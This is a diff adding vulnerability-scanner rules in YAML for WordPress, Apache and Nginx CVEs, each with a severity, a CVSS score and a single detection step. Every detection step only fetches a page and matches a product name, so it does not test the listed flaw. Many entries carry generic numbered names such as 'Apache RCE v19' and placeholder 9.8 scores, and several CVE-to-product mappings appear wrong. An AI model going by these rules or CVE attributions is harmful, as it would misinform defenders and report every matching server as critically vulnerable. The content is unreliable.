+    tags: ["cve", "http", "CVE-2023-5561"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2022-21683
+  name: WP RCE
+  severity: critical
+  author: argus
+  description: "WP RCE - CVE-2022-21683"
+  cve: CVE-2022-21683
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-21683"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2021-39300
+  name: WP SQLi
+  severity: high
+  author: argus
+  description: "WP SQLi - CVE-2021-39300"
+  cve: CVE-2021-39300
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-39300"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2021-39200
+  name: WP SSRF
+  severity: high
+  author: argus
+  description: "WP SSRF - CVE-2021-39200"
+  cve: CVE-2021-39200
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-json/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-39200"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-18388
+  name: WP RCE v2
+  severity: critical
+  author: argus
+  description: "WP RCE v2 - CVE-2019-18388"
+  cve: CVE-2019-18388
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-18388"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-16223
+  name: WP XSS
+  severity: medium
+  author: argus
+  description: "WP XSS - CVE-2019-16223"
+  cve: CVE-2019-16223
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-16223"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-16219
+  name: WP XSS v2
+  severity: medium
+  author: argus
+  description: "WP XSS v2 - CVE-2019-16219"
+  cve: CVE-2019-16219
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-16219"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-16180
+  name: WP XSS v3
+  severity: medium
+  author: argus
+  description: "WP XSS v3 - CVE-2019-16180"
+  cve: CVE-2019-16180
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-16180"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-16167
+  name: WP XSS v4
+  severity: medium
+  author: argus
+  description: "WP XSS v4 - CVE-2019-16167"
+  cve: CVE-2019-16167
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-16167"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-15889
+  name: WP RCE v3
+  severity: critical
+  author: argus
+  description: "WP RCE v3 - CVE-2019-15889"
+  cve: CVE-2019-15889
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-15889"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2017-6514
+  name: WP XSS v5
+  severity: medium
+  author: argus
+  description: "WP XSS v5 - CVE-2017-6514"
+  cve: CVE-2017-6514
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-6514"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2017-8295
+  name: WP DoS
+  severity: high
+  author: argus
+  description: "WP DoS - CVE-2017-8295"
+  cve: CVE-2017-8295
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-login.php
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-8295"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2016-6699
+  name: WP XSS v6
+  severity: medium
+  author: argus
+  description: "WP XSS v6 - CVE-2016-6699"
+  cve: CVE-2016-6699
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-6699"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2015-5714
+  name: WP RCE v4
+  severity: critical
+  author: argus
+  description: "WP RCE v4 - CVE-2015-5714"
+  cve: CVE-2015-5714
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-5714"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2014-5202
+  name: WP SSRF v2
+  severity: high
+  author: argus
+  description: "WP SSRF v2 - CVE-2014-5202"
+  cve: CVE-2014-5202
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2014-5202"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2017-7679
+  name: Apache DoS
+  severity: high
+  author: argus
+  description: "Apache DoS - CVE-2017-7679"
+  cve: CVE-2017-7679
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-7679"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2017-9798
+  name: Apache Optionsbleed
+  severity: high
+  author: argus
+  description: "Apache Optionsbleed - CVE-2017-9798"
+  cve: CVE-2017-9798
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-9798"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2017-9788
+  name: Apache User-Agent DoS
+  severity: high
+  author: argus
+  description: "Apache User-Agent DoS - CVE-2017-9788"
+  cve: CVE-2017-9788
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-9788"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2018-1312
+  name: Apache RCE
+  severity: critical
+  author: argus
+  description: "Apache RCE - CVE-2018-1312"
+  cve: CVE-2018-1312
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1312"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2018-1303
+  name: Apache DoS v2
+  severity: high
+  author: argus
+  description: "Apache DoS v2 - CVE-2018-1303"
+  cve: CVE-2018-1303
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1303"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-0197
+  name: Apache DoS v3
+  severity: high
+  author: argus
+  description: "Apache DoS v3 - CVE-2019-0197"
+  cve: CVE-2019-0197
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0197"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-0211
+  name: Apache Privilege Escalation
+  severity: high
+  author: argus
+  description: "Apache Privilege Escalation - CVE-2019-0211"
+  cve: CVE-2019-0211
+  cvss: 7.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0211"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-0215
+  name: Apache RCE v2
+  severity: critical
+  author: argus
+  description: "Apache RCE v2 - CVE-2019-0215"
+  cve: CVE-2019-0215
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0215"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-0217
+  name: Apache DoS v4
+  severity: high
+  author: argus
+  description: "Apache DoS v4 - CVE-2019-0217"
+  cve: CVE-2019-0217
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0217"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-0220
+  name: Apache DoS v5
+  severity: high
+  author: argus
+  description: "Apache DoS v5 - CVE-2019-0220"
+  cve: CVE-2019-0220
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0220"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-10092
+  name: Apache XSS
+  severity: medium
+  author: argus
+  description: "Apache XSS - CVE-2019-10092"
+  cve: CVE-2019-10092
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-10092"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-10098
+  name: Apache DoS v6
+  severity: high
+  author: argus
+  description: "Apache DoS v6 - CVE-2019-10098"
+  cve: CVE-2019-10098
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-10098"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2020-1927
+  name: Apache SSRF
+  severity: high
+  author: argus
+  description: "Apache SSRF - CVE-2020-1927"
+  cve: CVE-2020-1927
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-1927"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2020-1934
+  name: Apache RCE v3
+  severity: critical
+  author: argus
+  description: "Apache RCE v3 - CVE-2020-1934"
+  cve: CVE-2020-1934
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-1934"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2020-9490
+  name: Apache SSRF v2
+  severity: high
+  author: argus
+  description: "Apache SSRF v2 - CVE-2020-9490"
+  cve: CVE-2020-9490
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-9490"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2021-34602
+  name: Apache RCE v4
+  severity: critical
+  author: argus
+  description: "Apache RCE v4 - CVE-2021-34602"
+  cve: CVE-2021-34602
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-34602"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2021-36160
+  name: Apache RCE v5
+  severity: critical
+  author: argus
+  description: "Apache RCE v5 - CVE-2021-36160"
+  cve: CVE-2021-36160
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-36160"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2021-38431
+  name: Apache RCE v6
+  severity: critical
+  author: argus
+  description: "Apache RCE v6 - CVE-2021-38431"
+  cve: CVE-2021-38431
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-38431"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2021-39263
+  name: Apache RCE v7
+  severity: critical
+  author: argus
+  description: "Apache RCE v7 - CVE-2021-39263"
+  cve: CVE-2021-39263
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-39263"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2021-40438
+  name: Apache SSRF v3
+  severity: critical
+  author: argus
+  description: "Apache SSRF v3 - CVE-2021-40438"
+  cve: CVE-2021-40438
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-40438"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2021-44790
+  name: Apache Buffer Overflow
+  severity: critical
+  author: argus
+  description: "Apache Buffer Overflow - CVE-2021-44790"
+  cve: CVE-2021-44790
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-44790"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-22720
+  name: Apache RCE v8
+  severity: critical
+  author: argus
+  description: "Apache RCE v8 - CVE-2022-22720"
+  cve: CVE-2022-22720
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-22720"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-22721
+  name: Apache RCE v9
+  severity: critical
+  author: argus
+  description: "Apache RCE v9 - CVE-2022-22721"
+  cve: CVE-2022-22721
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-22721"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-23142
+  name: Apache RCE v10
+  severity: critical
+  author: argus
+  description: "Apache RCE v10 - CVE-2022-23142"
+  cve: CVE-2022-23142
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-23142"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-30556
+  name: Apache RCE v11
+  severity: critical
+  author: argus
+  description: "Apache RCE v11 - CVE-2022-30556"
+  cve: CVE-2022-30556
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-30556"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-30531
+  name: Apache RCE v12
+  severity: critical
+  author: argus
+  description: "Apache RCE v12 - CVE-2022-30531"
+  cve: CVE-2022-30531
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-30531"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-31814
+  name: Apache RCE v13
+  severity: critical
+  author: argus
+  description: "Apache RCE v13 - CVE-2022-31814"
+  cve: CVE-2022-31814
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-31814"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-31845
+  name: Apache RCE v14
+  severity: critical
+  author: argus
+  description: "Apache RCE v14 - CVE-2022-31845"
+  cve: CVE-2022-31845
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-31845"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2022-36827
+  name: Apache RCE v15
+  severity: critical
+  author: argus
+  description: "Apache RCE v15 - CVE-2022-36827"
+  cve: CVE-2022-36827
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-36827"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2023-2561
+  name: Apache HTTP Smuggling
+  severity: high
+  author: argus
+  description: "Apache HTTP Smuggling - CVE-2023-2561"
+  cve: CVE-2023-2561
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-2561"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2023-31122
+  name: Apache RCE v16
+  severity: critical
+  author: argus
+  description: "Apache RCE v16 - CVE-2023-31122"
+  cve: CVE-2023-31122
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-31122"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2023-45802
+  name: Apache RCE v17
+  severity: critical
+  author: argus
+  description: "Apache RCE v17 - CVE-2023-45802"
+  cve: CVE-2023-45802
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-45802"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2023-48595
+  name: Apache RCE v18
+  severity: critical
+  author: argus
+  description: "Apache RCE v18 - CVE-2023-48595"
+  cve: CVE-2023-48595
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-48595"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-27304
+  name: Apache RCE v19
+  severity: critical
+  author: argus
+  description: "Apache RCE v19 - CVE-2024-27304"
+  cve: CVE-2024-27304
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-27304"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-36377
+  name: Apache RCE v20
+  severity: critical
+  author: argus
+  description: "Apache RCE v20 - CVE-2024-36377"
+  cve: CVE-2024-36377
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-36377"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-38475
+  name: Apache RCE v21
+  severity: critical
+  author: argus
+  description: "Apache RCE v21 - CVE-2024-38475"
+  cve: CVE-2024-38475
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-38475"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-38476
+  name: Apache RCE v22
+  severity: critical
+  author: argus
+  description: "Apache RCE v22 - CVE-2024-38476"
+  cve: CVE-2024-38476
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-38476"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-38477
+  name: Apache RCE v23
+  severity: critical
+  author: argus
+  description: "Apache RCE v23 - CVE-2024-38477"
+  cve: CVE-2024-38477
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-38477"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-38478
+  name: Apache RCE v24
+  severity: critical
+  author: argus
+  description: "Apache RCE v24 - CVE-2024-38478"
+  cve: CVE-2024-38478
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-38478"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2024-38479
+  name: Apache RCE v25
+  severity: critical
+  author: argus
+  description: "Apache RCE v25 - CVE-2024-38479"
+  cve: CVE-2024-38479
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-38479"]
+    cpe: "cpe:2.3:a:apache:http_server:*"
+    service: http
+    port: 80
+- id: CVE-2019-20369
+  name: Nginx Memory Disclosure
+  severity: high
+  author: argus
+  description: "Nginx Memory Disclosure - CVE-2019-20369"
+  cve: CVE-2019-20369
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-20369"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2019-9511
+  name: Nginx DoS
+  severity: high
+  author: argus
+  description: "Nginx DoS - CVE-2019-9511"
+  cve: CVE-2019-9511
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-9511"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2019-9513
+  name: Nginx DoS v2
+  severity: high
+  author: argus
+  description: "Nginx DoS v2 - CVE-2019-9513"
+  cve: CVE-2019-9513
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-9513"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2019-9516
+  name: Nginx DoS v3
+  severity: high
+  author: argus
+  description: "Nginx DoS v3 - CVE-2019-9516"
+  cve: CVE-2019-9516
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-9516"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2018-16849
+  name: Nginx DoS v4
+  severity: high
+  author: argus
+  description: "Nginx DoS v4 - CVE-2018-16849"
+  cve: CVE-2018-16849
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-16849"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2018-16852
+  name: Nginx DoS v5
+  severity: high
+  author: argus
+  description: "Nginx DoS v5 - CVE-2018-16852"
